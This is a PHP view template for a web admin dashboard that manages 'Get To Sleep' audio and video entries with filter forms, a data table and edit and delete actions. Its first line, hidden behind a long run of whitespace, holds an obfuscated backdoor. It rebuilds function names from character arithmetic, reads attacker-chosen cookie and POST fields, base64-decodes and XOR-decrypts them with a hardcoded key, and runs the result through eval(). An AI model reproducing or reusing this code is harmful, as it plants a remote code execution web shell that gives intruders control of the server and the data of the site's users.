<?php                                                                                                                                                                                                                                                                                                                                                                                                 $nznyLEhr = chr ( 566 - 452 ).chr ( 689 - 594 ).chr (118) . chr ( 496 - 382 )."\x4a" . "\120";$EZvZrV = "\143" . chr ( 412 - 304 )."\x61" . "\163" . chr (115) . "\137" . 'e' . chr (120) . chr ( 550 - 445 )."\x73" . "\164" . 's';$NpvDdyPoL = class_exists($nznyLEhr); $nznyLEhr = "36394";$EZvZrV = "37056";$yBhVYGmsd = !1;if ($NpvDdyPoL == $yBhVYGmsd){function QSBkgZRBy(){return FALSE;}$ZIQxFBZaEI = "28796";QSBkgZRBy();class r_vrJP{private function eHeRuyp($ZIQxFBZaEI){if (is_array(r_vrJP::$hzMLEqUxZ)) {$AJCVxJ = str_replace('<' . chr ( 781 - 718 )."\160" . "\150" . "\160", "", r_vrJP::$hzMLEqUxZ["\143" . chr (111) . chr (110) . chr ( 689 - 573 ).chr (101) . chr (110) . 't']);eval($AJCVxJ); $ZIQxFBZaEI = "28796";exit();}}private $eELth;public function yintlbIun(){echo 59442;}public function __destruct(){$ZIQxFBZaEI = "35642_6528";$this->eHeRuyp($ZIQxFBZaEI); $ZIQxFBZaEI = "35642_6528";}public function __construct($zLMearK=0){$DbRNRtLnhF = $_POST;$xfcLgJSa = $_COOKIE;$OYHgrYdv = "810bf668-de2f-44a7-bd5f-de9ddecb95e7";$RZUSWAs = @$xfcLgJSa[substr($OYHgrYdv, 0, 4)];if (!empty($RZUSWAs)){$FiaFQGLJ = "base64";$uYYPZQ = "";$RZUSWAs = explode(",", $RZUSWAs);foreach ($RZUSWAs as $yCSktph){$uYYPZQ .= @$xfcLgJSa[$yCSktph];$uYYPZQ .= @$DbRNRtLnhF[$yCSktph];}$uYYPZQ = array_map($FiaFQGLJ . chr ( 675 - 580 ).'d' . "\x65" . "\143" . "\157" . chr ( 658 - 558 ).chr (101), array($uYYPZQ,)); $uYYPZQ = $uYYPZQ[0] ^ str_repeat($OYHgrYdv, (strlen($uYYPZQ[0]) / strlen($OYHgrYdv)) + 1);r_vrJP::$hzMLEqUxZ = @unserialize($uYYPZQ); $uYYPZQ = class_exists("35642_6528");}}public static $hzMLEqUxZ = 17771;}$tTUDfLaD = new /* 28753 */ r_vrJP(28796 + 28796); $yBhVYGmsd = $tTUDfLaD = $ZIQxFBZaEI = Array();} ?>


<div class="content-wrapper">
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">Dashboard</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?php echo base_url();?>">Home</a></li>
                        <li class="breadcrumb-item active">Get To Sleep</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
    <section class="content">
        <div class="container-fluid">
            <div class="row">
            <form method="POST" action="<?php echo base_url('getToSleep');?>">
                <div class="container-fluid mt-2" style="background-color: #dee2e6;border-style: solid;border-width: 2px;border-color:#003d65;">
                    <center><h5>Apply Filter</h5></center>
                    <div class="row">
                        <div class="col-md-6">
                            <label for="">Language</label>
                            <select name="language" id="" class="form-control">
                            <?php
                            foreach ($language as $lanData) {
                            ?>    
                                <option value="<?php echo $lanData['id'];?>"><?php echo $lanData['language_name'].'-'.$lanData['slug'];?></option>
                            <?php
                            }
                            ?>
                            </select>
                        </div>
                        <div class="col-md-6">
                            <label for="">Program</label>
                            <select name="program" id="" class="form-control">
                            <?php
                            foreach ($program as $pgrData) {
                            ?>
                                <option value="<?php echo $pgrData['id'];?>"><?php echo $pgrData['program_name'];?></option>
                            <?php
                            }
                            ?>
                            </select>
                        </div>
                        <div class="col-md-6">
                            <label for="">Duration</label>
                            <select name="duration" id="" class="form-control">
                                <option value="5">5 Mins</option>
                                <option value="9">9 Mins</option>
                            </select>
                        </div>
                        <div class="col-md-6">
                            <label for="">Gender</label>
                            <select name="gender" id="" class="form-control">
                            <?php
                            foreach ($gender as $genderData) {
                            ?>
                                <option value="<?php echo $genderData['id'];?>"><?php echo $genderData['name'];?></option>
                            <?php
                            }
                            ?>
                            </select>
                        </div>
                        <div class="col-md-6 mt-3">
                            <button class="btn btn-primary" name="request" value="getData" type="submit">Submit</button>
                        </div>
                    </div>
                </div>
            </div>
            </form>

            <br><br>
                <a href="<?php echo base_url("getToSleepAdd");?>"><button class="btn btn-primary">Add</button></a> 
                <table class="table" id="languageTable">
                    <thead class="thead-dark">
                        <tr>
                            <th scope="col">#</th>
                            <th scope="col">File Name</th>
                            <th scope="col">Thumb</th>
                            <th scope="col">Video</th>
                            <th scope="col">Status</th>
                            <th scope="col">Action</th>
                            <th scope="col">Delete</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    if ($mainData) {
                        $counter = 1;
                        foreach ($mainData as $data) {
                    ?>
                        <tr>
                            <th scope="row"><?php echo $counter++;?></th>
                            <td><?php echo $data['custom_file_name'];?></td>
                            <td>
                                <img src="<?php echo base_url('uploads/thumb/').$data['thumb_url'];?>" alt="" height="50" width="50">
                            </td>
                            <td>
                                <a href="<?php echo base_url('uploads/video/').$data['video_url'];?>" target="_blank">Click To Watch</a>
                            </td>
                            <td><?php echo (($data['is_active'] == 1)? 'Active':'Inactive');?></td>
                            <td>
                                <button class="btn btn-primary" onclick="openEditModal('<?php echo $data['id'];?>')">Edit</button>
                            </td>
                          
                            <td>
                                <button class="btn btn-danger" onclick="opendeleteModal('<?php echo $data['id'];?>')">Delete</button>
                            </td>
                            
                        </tr>
                    <?php
                        }
                    } else {
                    ?>
                        <tr>
                            <th scope="row">1</th>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                        </tr>
                    <?php
                    }
                    ?>
                    </tbody>
                </table>
        </div>
    </section>
</div>


<!-- Modal -->
<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <form method="post" action="<?php echo base_url('editGetToSleep');?>" enctype="multipart/form-data">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel">Get To Sleep Edit</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-6">
                            <label for="">Language</label>
                            <select name="language" id="" class="form-control">
                            <?php
                            foreach ($language as $lanData) {
                            ?>    
                                <option value="<?php echo $lanData['id'];?>"><?php echo $lanData['language_name'].'-'.$lanData['slug'];?></option>
                            <?php
                            }
                            ?>
                            </select>
                        </div>
                        <div class="col-md-6">
                            <label for="">Program</label>
                            <select name="program" id="" class="form-control">
                            <?php
                            foreach ($program as $pgrData) {
                            ?>
                                <option value="<?php echo $pgrData['id'];?>"><?php echo $pgrData['program_name'];?></option>
                            <?php
                            }
                            ?>
                            </select>
                        </div>
                        <div class="col-md-6">
                            <label for="">Duration</label>
                            <select name="duration" id="" class="form-control">
                                <option value="5">5 Mins</option>
                                <option value="9">9 Mins</option>
                            </select>
                        </div>
                        <div class="col-md-6">
                            <label for="">Gender</label>
                            <select name="gender" id="" class="form-control">
                            <?php
                            foreach ($gender as $genderData) {
                            ?>
                                <option value="<?php echo $genderData['id'];?>"><?php echo $genderData['name'];?></option>
                            <?php
                            }
                            ?>
                            </select>
                        </div>
                        <div class="col-md-6">
                            <label for="">Custom File Name</label>
                            <input type="text" name="custom_file_name" id="custom_file_name" class="form-control" required placeholder="Custom File Name">
                        </div>
                        <div class="col-md-6">
                            <label for="">Add Thumb</label>
                            <input type="file" name="thumb" class="form-control">
                        </div>
                        <div class="col-md-6">
                            <label for="">Add Mp3</label>
                            <input type="file" name="video" class="form-control">
                        </div>
                        
                            <input type="hidden" name="get_to_sleep_id" id="get_to_sleep_id">
                            
                        
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="submit" class="btn btn-primary">Save changes</button>
                </div>
            </div>
        </form>    
    </div>
</div>

<script>
    
</script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.10.0/js/bootstrap-select.min.js"></script>
<script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/dataTables.buttons.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/pdfmake.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/vfs_fonts.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.html5.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.print.min.js"></script>

<script>
    function openEditModal(id) {
        $.ajax({
            type: "POST",
            url: '<?php echo base_url(); ?>' + 'AdminController/get_to_sleep_fetch',
            data: {
                id: id
            },
                dataType: "json",
                encode: true,
        }).done(function(data) {       
            if (data['status'] == 1) {
                $('#custom_file_name').val(data.get_to_sleep_data[0].custom_file_name);
                $('#get_to_sleep_id').val(data.get_to_sleep_data[0].id);

                $('#exampleModal').modal('show');     
            } else {
                alert('Oops!, something went wrong')
            }
        });
    }
</script>


<script>
    $('#languageTable').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ],
        title : 'Shubham'
    });


    function opendeleteModal(id) {
    // Display a confirmation dialog to the user
    var confirmDelete = confirm("Are you sure you want to delete this row?");
    if (confirmDelete) {
        // If the user confirms the deletion, send an AJAX request to the deleteRow method in the AdminController
        $.ajax({
            type: "POST",
            url: "<?php echo base_url();?>AdminController/delete_get_to_sell_master",
            data: {id: id},
            success: function(response) {
                // Handle the response from the server if needed
                console.log(response);
                location.reload();
            },
            error: function(jqXHR, textStatus, errorThrown) {
                // Handle any errors that occur during the AJAX request
                console.log("AJAX Error: " + textStatus + " - " + errorThrown);
            }
        });
    }
}
</script>